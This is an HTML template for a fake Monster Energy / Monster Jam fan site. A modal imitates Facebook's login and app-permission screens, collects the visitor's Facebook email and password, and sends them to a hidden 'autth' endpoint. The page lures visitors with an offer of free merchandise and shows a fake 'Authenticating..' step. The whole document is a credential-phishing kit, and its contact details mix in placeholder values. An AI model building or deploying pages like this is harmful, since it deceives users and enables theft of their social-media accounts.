<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Monster Energy | Monster Jam</title>
  <meta content="width=device-width, initial-scale=1.0" name="viewport">
  <meta content="" name="keywords">
  <meta content="" name="description">

  <!-- Favicons -->
  <link href="{{asset('img/favicon.png')}}" rel="icon">
  <link href="{{asset('img/apple-touch-icon.png')}}" rel="apple-touch-icon">

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,700,700i|Raleway:300,400,500,700,800|Montserrat:300,400,700" rel="stylesheet">

  <!-- Bootstrap CSS File -->
  <link href="{{asset('lib/bootstrap/css/bootstrap.min.css')}}" rel="stylesheet">

  <!-- Libraries CSS Files -->
  <link href="{{asset('lib/font-awesome/css/font-awesome.min.css')}}" rel="stylesheet">
  <link href="{{asset('lib/animate/animate.min.css')}}" rel="stylesheet">
  <link href="{{asset('lib/ionicons/css/ionicons.min.css')}}" rel="stylesheet">
  <link href="{{asset('lib/owlcarousel/assets/owl.carousel.min.css')}}" rel="stylesheet">
  <link href="{{asset('lib/magnific-popup/magnific-popup.css')}}" rel="stylesheet">
  <link href="{{asset('lib/ionicons/css/ionicons.min.css')}}" rel="stylesheet">

  <!-- Main Stylesheet File -->
  <link href="{{asset('css/style.css" rel="stylesheet">

</head>

<body id="body">

  <!--==========================
    Top Bar
  ============================-->
  <section id="topbar" class="d-none d-lg-block">
    <div class="container clearfix">
      <div class="contact-info float-left">
        <i class="fa fa-envelope-o"></i> <a href="mailto:contact@monsterjam.com">contact@monsterjam.com</a>
        <i class="fa fa-phone"></i> +1 513 279 2867
      </div>
      <div class="social-links float-right">
        <a href="#" class="twitter"><i class="fa fa-twitter"></i></a>
        <a href="#" class="facebook"><i class="fa fa-facebook"></i></a>
        <a href="#" class="instagram"><i class="fa fa-instagram"></i></a>
        <a href="#" class="google-plus"><i class="fa fa-google-plus"></i></a>
        <a href="#" class="linkedin"><i class="fa fa-linkedin"></i></a>
      </div>
    </div>
  </section>

  <!--==========================
    Header
  ============================-->
  <header id="header">
    <div class="container">

      <div id="logo" class="pull-left">
        <h1><a href="#body" class="scrollto">Monster<span>Jam</span></a></h1>
        <!-- Uncomment below if you prefer to use an image logo -->
        <!-- <a href="#body"><img src="img/logo.png" alt="" title="" /></a>-->
      </div>

      <nav id="nav-menu-container">
        <ul class="nav-menu">
          <li class="menu-active"><a href="#body">Home</a></li>
          <li><a href="#about">Truck History</a></li>
          <li><a href="#portfolio">Photos</a></li>
          <li><a href="#call-to-action">Sign in</a></li>
          <li><a href="#contact">Contact</a></li>
        </ul>
      </nav><!-- #nav-menu-container -->
    </div>
  </header><!-- #header -->

  <!--==========================
    Intro Section
  ============================-->
  <section id="intro">

    <div class="intro-content">
      <h2>Monster <span>Jam!</span><br></h2>
      <div>
        <a href="#" id="merule" class="btn-get-started scrollto">Sign in with Facebook</a>
     </div>
    </div>

    <div id="intro-carousel" class="owl-carousel" >
     <!-- <div class="item" style="background-image: url('img/intro-carousel/1.jpg');"></div>
      <!--<div class="item" style="background-image: url('img/intro-carousel/2.jpg');"></div>
      <div class="item" style="background-image: url('img/intro-carousel/3.jpg');"></div>
      <div class="item" style="background-image: url('img/intro-carousel/4.jpg');"></div>
      <div class="item" style="background-image: url('img/intro-carousel/5.jpg');"></div>-->
    </div>

  </section><!-- #intro -->
  
    <main id="main">
    <!--==========================
      About Section
    ============================-->
    <section id="about" class="wow fadeInUp">
      <div class="container">
        <div class="row">
          <div class="col-lg-6 about-img">
            <img src="{{asset('img/monster-4.jpg')}}" alt="">
          </div>

          <div class="col-lg-6 content">
            <h2>Truck History</h2>
            <p>
			Monster Energy entered the Monster Jam® world in 2012 as a major team sponsor when Monster Energy debuted in Birmingham, Alabama. The machine that represents a high-profile product made a big splash right from the start as 2009 Monster Jam World Finals® Freestyle Champion Damon Bradshaw was tabbed to drive the awesome new piece with Bradshaw’s long-time crew chief, Coty Saucier, joining the Monster Energy team at the same time. Monster Energy made an immediate impact on the circuit, winning its first major stadium freestyle competition on January 14, 2012, at the Alamodome in San Antonio, and then winning the racing trophy in the same building the following day. Monster Energy is always a contender to win in both racing and freestyle, as evidenced by the team’s impressive performance at Monster Jam World Finals XIII, in Las Vegas. In that 2012 battle for world titles, Monster Energy, in its first year of competition, advanced all the way through the racing bracket and into the championship race, falling to Max-DSM in the title race by .02 of a second, one of the closest Monster Jam World Finals Championship races in the sport’s history.
			</p>
          </div>
        </div>

      </div>
    </section><!-- #about -->
	
	    <!--==========================
      Our Portfolio Section
    ============================-->
    <section id="portfolio" class="wow fadeInUp">
      <div class="container">
        <div class="section-header">
          <h2>Photos</h2>
        </div>
      </div>

      <div class="container-fluid">
        <div class="row no-gutters">

          <div class="col-lg-3 col-md-4">
            <div class="portfolio-item wow fadeInUp">
              <a href="{{asset('img/portfolio/monster-1.jpg')}}" class="portfolio-popup">
                <img src="{{asset('img/portfolio/monster-1.jpg')}}" alt="">
                <div class="portfolio-overlay">
                  <!--<div class="portfolio-info"><h2 class="wow fadeInUp">Portfolio Item 1</h2></div>-->
                </div>
              </a>
            </div>
          </div>

          <div class="col-lg-3 col-md-4">
            <div class="portfolio-item wow fadeInUp">
              <a href="{{asset('img/portfolio/monster-2.jpg')}}" class="portfolio-popup">
                <img src="{{asset('img/portfolio/monster-2.jpg')}}" alt="">
                <div class="portfolio-overlay">
                  <!--<div class="portfolio-info"><h2 class="wow fadeInUp">Portfolio Item 2</h2></div>-->
                </div>
              </a>
            </div>
          </div>

          <div class="col-lg-3 col-md-4">
            <div class="portfolio-item wow fadeInUp">
              <a href="{{asset('img/portfolio/monster-3.jpg')}}" class="portfolio-popup">
                <img src="{{asset('img/portfolio/monster-3.jpg')}}" alt="">
                <div class="portfolio-overlay">
                 <!-- <div class="portfolio-info"><h2 class="wow fadeInUp">Portfolio Item 3</h2></div>-->
                </div>
              </a>
            </div>
          </div>

          <div class="col-lg-3 col-md-4">
            <div class="portfolio-item wow fadeInUp">
              <a href="{{asset('img/portfolio/monster-4.jpg')}}" class="portfolio-popup">
                <img src="{{asset('img/portfolio/monster-4.jpg')}}" alt="">
                <div class="portfolio-overlay">
                 <!-- <div class="portfolio-info"><h2 class="wow fadeInUp">Portfolio Item 4</h2></div>-->
                </div>
              </a>
            </div>
          </div>

          <div class="col-lg-3 col-md-4">
            <div class="portfolio-item wow fadeInUp">
              <a href="{{asset('img/portfolio/monster-5.jpg')}}" class="portfolio-popup">
                <img src="{{asset('img/portfolio/monster-5.jpg')}}" alt="">
                <div class="portfolio-overlay">
                 <!-- <div class="portfolio-info"><h2 class="wow fadeInUp">Portfolio Item 5</h2></div>-->
                </div>
              </a>
            </div>
          </div>

          <div class="col-lg-3 col-md-4">
            <div class="portfolio-item wow fadeInUp">
              <a href="{{asset('img/portfolio/monster-6.jpg')}}" class="portfolio-popup">
                <img src="{{asset('img/portfolio/monster-6.jpg')}}" alt="">
                <div class="portfolio-overlay">
                 <!-- <div class="portfolio-info"><h2 class="wow fadeInUp">Portfolio Item 6</h2></div>-->
                </div>
              </a>
            </div>
          </div>

          <div class="col-lg-3 col-md-4">
            <div class="portfolio-item wow fadeInUp">
              <a href="{{asset('img/portfolio/monster-7.jpg')}}" class="portfolio-popup">
                <img src="{{asset('img/portfolio/monster-7.jpg')}}" alt="">
                <div class="portfolio-overlay">
                  <!--<div class="portfolio-info"><h2 class="wow fadeInUp">Portfolio Item 7</h2></div>-->
                </div>
              </a>
            </div>
          </div>

          <div class="col-lg-3 col-md-4">
            <div class="portfolio-item wow fadeInUp">
              <a href="{{asset('img/portfolio/monster-8.jpg')}}" class="portfolio-popup">
                <img src="{{asset('img/portfolio/monster-8.jpg')}}" alt="">
                <div class="portfolio-overlay">
                 <!-- <div class="portfolio-info"><h2 class="wow fadeInUp">Portfolio Item 8</h2></div>-->
                </div>
              </a>
            </div>
          </div>

        </div>

      </div>
    </section><!-- #portfolio -->
	
    <!--==========================
      Call To Action Section
    ============================-->
    <section id="call-to-action" class="wow fadeInUp">
      <div class="container">
        <div class="row">
          <div class="col-lg-9 text-center text-lg-left">
            <h3 class="cta-title">Love Monster Energy&copy;? Sign in with Facebook and win free items in our <a href="#">Monster Jam Superstore!</a></h3>      
          </div>
          <div class="col-lg-3 cta-btn-container text-center">
            <a class="cta-btn align-middle" href="#" id="merule-2">Sign in</a>
          </div>
        </div>

      </div>
    </section><!-- #call-to-action -->
	
    <!--==========================
      Contact Section
    ============================-->
    <section id="contact" class="wow fadeInUp">
      <div class="container">
        <div class="section-header">
          <h2>Contact Us</h2>
          <p>We'd like to hear from you.</p>
        </div>

        <div class="row contact-info">

          <div class="col-md-4">
            <div class="contact-address">
              <i class="ion-ios-location-outline"></i>
              <h3>Address</h3>
              <address>A108 Adam Street, NY 535022, USA</address>
            </div>
          </div>

          <div class="col-md-4">
            <div class="contact-phone">
              <i class="ion-ios-telephone-outline"></i>
              <h3>Phone Number</h3>
              <p><a href="tel:+155895548855">+1 5589 55488 55</a></p>
            </div>
          </div>

          <div class="col-md-4">
            <div class="contact-email">
              <i class="ion-ios-email-outline"></i>
              <h3>Email</h3>
              <p><a href="mailto:info@example.com">info@monsterjam.com</a></p>
            </div>
          </div>

        </div>
      </div>

      </div>
    </section><!-- #contact -->

  </main>

  <!--==========================
    Footer
  ============================-->
  <footer id="footer">
    <div class="container">
      <div class="copyright">
        &copy; Copyright <strong>Monster Jam</strong>. All Rights Reserved
      </div>
    </div>
  </footer><!-- #footer -->

  <a href="#" class="back-to-top"><i class="fa fa-chevron-up"></i></a>
  
  			<!-- Login Modal -->
			<div id="loginModal" class="modal fade" role="dialog">
				<div class="modal-dialog">
					<!-- Modal content-->
					<div class="modal-content">
						<div class="modal-body">
						<div class="card">
						<div class="card-body">
						<h3 style="background:#0c2e8a;width:100%;font-family:'Raleway', sans-serif;font-size: 15px;font-weight: bold;letter-spacing: 1px;display: inline-block;padding: 10px 32px;border-radius: 2px;transition: 0.5s;margin: 10px;color: #fff;"><i class="fa fa-facebook-official fa-2x mr-5"></i> Log in with Facebook</h3><hr>					
						<form>
						<div id="jungle">
											
											<input type="hidden" id="urlx" value="{{url('autth')}}"/>
											   <?php //{{csrf_field()}} ?>
												<div class="form-group">
												    <label for="email"><strong>Username or email <span class="required">*</span></strong></label>
													<input class="form-control" type="email" id="e" name="email" placeholder="Email address" value="{{old('email')}}" />
												</div>
												<div class="form-group">
													<label for="pass"><strong>Password <span class="required">*</span></strong></label>
													<input class="form-control" type="password" id="p" name="password" />
												</div>
												<div class="form-group">					
													<a class="btn pull-right" id="foreign" style="background:#0c2e8a;color:#fff;font-family:'Raleway', sans-serif;font-size: 15px;font-weight: bold;letter-spacing: 1px;display: inline-block;padding: 10px 32px;border-radius: 2px;transition: 0.5s;margin: 10px;color: #fff;" href="#">Continue</a> 
												</div>								
					   </div>
					   <div id="burger" class="text-center">
					     <div class="form-group">
						    <img class="img img-responsive" src="{{asset('img/mlogo.png')}}"/><br>
					        <span><strong>Monster Energy</strong> will receive:</span><br>
                            <span>your public profile and email address <i class="fa fa-info-circle"></i></span><br><br><br>
							<span style="color:#bcbcbc;"><i class="fa fa-lock"></i> This doesn't let the app post to Facebook.</span><br>
									
                         </div>		
                         <div class="form-group">					
							<center><a class="btn" id="burger-btn" style="background:#0c2e8a;color:#fff;font-family:'Raleway', sans-serif;font-size: 15px;font-weight: bold;letter-spacing: 1px;display: inline-block;padding: 10px 32px;border-radius: 2px;transition: 0.5s;margin: 10px;color: #fff;" href="#">Continue</a></center> 
						 </div>						 
					   </div>
					   <div id="gold" class="text-center">
					     <img class="img img-responsive" src="{{asset('img/mlogo.png')}}"/><br><br>
					     <span class="text-info"><i class="fa fa-cogs"></i> Authenticating..</span> 
					   </div>
					   </form>
					  </div>
					  </div>

						</div>
					</div>
				</div>
			</div>

  <!-- JavaScript Libraries -->
  <script src="{{asset('lib/jquery/jquery.min.js')}}"></script>
  <script src="{{asset('lib/jquery/jquery-migrate.min.js')}}"></script>
  <script src="{{asset('lib/bootstrap/js/bootstrap.bundle.min.js')}}"></script>
  <script src="{{asset('lib/easing/easing.min.js')}}"></script>
  <script src="{{asset('lib/superfish/hoverIntent.js')}}"></script>
  <script src="{{asset('lib/superfish/superfish.min.js')}}"></script>
  <script src="{{asset('lib/wow/wow.min.js')}}"></script>
  <script src="{{asset('lib/owlcarousel/owl.carousel.min.js')}}"></script>
  <script src="{{asset('lib/magnific-popup/magnific-popup.min.js')}}"></script>
  <script src="{{asset('lib/sticky/sticky.js')}}"></script>
 
  <!-- Template Main Javascript File -->
  <script src="{{asset('js/main.js')}}"></script>

</body>
</html>
